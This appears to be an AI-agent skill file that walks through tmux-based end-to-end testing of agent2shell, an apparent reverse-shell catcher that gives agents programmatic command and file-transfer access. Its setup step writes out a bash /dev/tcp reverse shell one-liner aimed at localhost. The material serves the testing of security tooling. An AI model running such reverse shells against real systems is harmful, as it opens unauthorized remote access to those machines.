---
name: agent2shell-dev-e2e-testing
description: >
  Use when manually testing agent2shell end-to-end, running E2E tests with
  tmux, verifying the binary works after changes, or setting up a tmux-based
  test environment. Covers catch/run/status/list/push/pull/stdin commands and
  rules for AI agents automating E2E tests via tmux send-keys. Triggers on:
  "test manually", "e2e test", "test with tmux", "verify the binary",
  "manual testing", "tmux test setup".
---

# E2E Testing with tmux

End-to-end testing of agent2shell using tmux sessions to simulate a real reverse shell engagement.

## Setup

Three tmux sessions:

| Session | Role | What runs |
|---------|------|-----------|
| **Session A** | Operator | `agent2shell catch -p 4444` — catches the reverse shell |
| **Session B** | Victim | `bash -c 'bash >& /dev/tcp/127.0.0.1/4444 0>&1'` — sends the reverse shell |
| **Session C** | Agent/Tester | `agent2shell run`, `status`, `list`, `push`, `pull` — programmatic access |

## Steps

1. Start the listener (Session A)
```bash
agent2shell catch -p 4444
```

2. Send reverse shell (Session B)
```bash
bash -c 'bash >& /dev/tcp/127.0.0.1/4444 0>&1'
```

3. Wait for "[*] Session ready: /tmp/a2s-1.sock" in Session A

4. Test from Session C
```bash
agent2shell run whoami
agent2shell run uname -a
agent2shell status
agent2shell status --json
agent2shell list
agent2shell list --json
```

5. Test file transfer
```bash
echo "test content" > /tmp/test-push.txt
agent2shell push /tmp/test-push.txt /tmp/test-received.txt
agent2shell pull /tmp/test-received.txt /tmp/test-pulled.txt
diff /tmp/test-push.txt /tmp/test-pulled.txt
```

6. Test long-running command with timeout and stdin
```bash
agent2shell run -t 10 "for i in 1 2 3 4 5; do echo line-\$i; sleep 1; done"
agent2shell run -t 10 --stdin /tmp/test-push.txt    # reuse the push test file
```

7. Test interactive mode in Session A
Type commands directly — output appears in the terminal
Ctrl-C sends interrupt to remote shell
Ctrl-C twice within 2 seconds shuts down

8. Clean up
Ctrl-C twice in Session A to shut down
Session B returns to its shell prompt


## Rules for Automated Testing (AI agents using tmux)

1. **NEVER send commands to Session A** via `tmux send-keys` after setup — that's the operator's interactive terminal. The stdin reader goroutine owns it.
2. Only use `tmux send-keys` for Session A and B during **initial setup** (starting catch, sending reverse shell).
3. All testing happens from Session C using `agent2shell run`, `status`, `list`, etc.
4. Use `tmux capture-pane -t <session> -p` to **observe** Session A output — never to interact.
5. Always wrap socket API calls with `timeout 10` to prevent hangs.
6. Clean stale sockets before each test: `rm -f /tmp/a2s-*.sock 2>/dev/null`
7. Kill stuck processes via `pkill -f agent2shell`.
8. Wait **6-8 seconds** after reverse shell connects for detection probes to finish before testing.
9. After testing, kill catch via `tmux send-keys -t <session> C-c` twice (double-tap Ctrl-C).

## Verifying Interactive Mode

Check Session A's output after running socket API commands:

```bash
tmux capture-pane -t <session-a> -p | tail -20
```

You should see `[a2s]` labels for socket API commands and `[local]` for operator-typed commands:

```
[*] Connection from 127.0.0.1:54321
[*] Session ready: /tmp/a2s-1.sock
[a2s] whoami
tester
[a2s] uname -a
Linux 6.8.0-110-generic ...
```

## EC2 Testing

For testing over a real network with SSH tunnel, see `scripts/ec2-create.sh` and `scripts/ec2-destroy.sh`.
